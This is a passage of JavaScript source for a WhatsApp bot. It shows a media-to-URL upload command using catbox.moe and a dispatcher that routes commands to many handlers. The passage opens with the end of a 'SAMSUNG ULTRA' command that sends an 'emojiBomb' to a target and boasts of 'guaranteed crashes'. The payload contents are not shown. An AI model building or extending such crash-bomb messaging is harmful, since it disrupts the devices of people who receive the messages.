    await sock.sendMessage(target, emojiBomb, {});

    console.log(`[ULTRA] All payloads sent to ${target}`);
    await reply('✅ SAMSUNG ULTRA delivered – guaranteed crashes.');

  } catch (e) {
    console.error('[ULTRA] ERROR:', e);
    await reply(`❌ ULTRA failed: ${e.message}`);
  }
  break;
}case 'tourl1':
case 'upload':
case 'toupload': {
    await reaction('📄');

    const { qMsg: qMsgTU, qType: qTypeTU, qKey: qKeyTU } = getQuoted(m);
    const MEDIA_TYPES = ['imageMessage', 'videoMessage', 'stickerMessage', 'audioMessage', 'documentMessage'];
    const mediaTypeTU = MEDIA_TYPES.find(t2 => qMsgTU?.[t2]);

    if (!qMsgTU || !mediaTypeTU) {
        await sock.sendMessage(jid, {
            text: `❌ Reply to an image, video, sticker, or audio with .tourl`
        }, { quoted: m });
        break;
    }

    try {
        // 1. Download the media
        const buf = await dlMedia(qMsgTU, qKeyTU);
        if (!buf) throw new Error('Media download failed');

        // 2. Upload to Catbox.moe (free, no auth)
        const FormData = require('form-data');
        const form = new FormData();
        const ext = mediaTypeTU.replace('Message', '').toLowerCase();
        const filename = `upload_${Date.now()}.${ext === 'sticker' ? 'webp' : ext === 'audio' ? 'mp3' : 'mp4'}`;
        form.append('fileToUpload', buf, filename);
        form.append('reqtype', 'fileupload');

        const response = await axios.post('https://catbox.moe/user/api.php', form, {
            headers: {
                ...form.getHeaders(),
                'User-Agent': 'Mozilla/5.0',
            },
            timeout: 30000,
        });

        const link = response.data.trim();
        if (!link || !link.startsWith('https://')) throw new Error('Upload failed');

        // 3. Send the link as a clean reply
        await sock.sendMessage(jid, {
            text: `✅ *Upload Complete!*\n\n🔗 ${link}\n\n📌 Expires: Never`
        }, { quoted: m });

        await reaction('✅');

    } catch (e) {
        console.error('[tourl] Error:', e.message);
        await sock.sendMessage(jid, {
            text: `❌ Upload failed: ${e.message}`
        }, { quoted: m });
    }
    break;
}
    default: {
      const h = { reply, replyImg, ft, cfg, dlMedia, reaction, normNum, getQuoted, isOwner: _isOwner };
      if (await reactionHandler(sock, m, cmd, args, h)) break;
      if (await scrapsHandler(sock, m, cmd, args, h))   break;
      if (await illusionHandler(sock, m, cmd, args, h)) break;
      if (await socialHandler(sock, m, cmd, args, h))   break;
      if (await aiHandler(sock, m, cmd, args, h))       break;
      if (await economyHandler(sock, m, cmd, args, h))  break;
      if (await toolsHandler(sock, m, cmd, args, h))    break;
      if (await stickerHandler(sock, m, cmd, args, h))  break;
      if (await musicHandler(sock, m, cmd, args, h))    break;
      if (await gamesHandler(sock, m, cmd, args, h))    break;
      if (await adminHandler(sock, m, cmd, args, h))    break;
      if (await arabicHandler(sock, m, cmd, args, h))   break;

      // June Ultra commands are registered in case.js and are tried only
      // after native VARNOX handlers, preserving existing command precedence.
      if (await dispatchJuneCommandFromCase({
        sock, m, cmd, args, jid, sender, c, isGroup, _isOwner,
        isBotAdmins, groupMetadata, reply, reaction,
      })) break;

      await devHandler(sock, m, cmd, args, h);
      break;
    }
  }
}

module.exports = { handleMessage, runAutoFollow, CMDS };
